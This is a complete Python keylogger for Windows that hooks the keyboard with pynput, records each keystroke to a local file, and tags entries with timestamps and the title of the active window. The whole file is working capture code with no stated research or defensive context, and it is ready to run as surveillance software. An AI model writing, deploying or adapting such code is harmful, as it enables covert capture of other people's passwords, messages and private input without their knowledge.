import os
from pynput import keyboard
import win32gui
import datetime

# Get the directory where this script is located
base_path = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(base_path, "key_log.txt")

current_window = None

def get_active_window():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def on_press(key):
    global current_window

    active_window = get_active_window()
    if active_window != current_window:
        current_window = active_window
        with open(log_file_path, "a") as log_file:
            log_file.write(f"\n\n[{datetime.datetime.now()}] - Active Window: {active_window}\n")

    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.backspace:
                log_file.write("[Bsp]")
            elif key == keyboard.Key.delete:
                log_file.write("[Del]")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            else:
                log_file.write(f"[{key.name}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()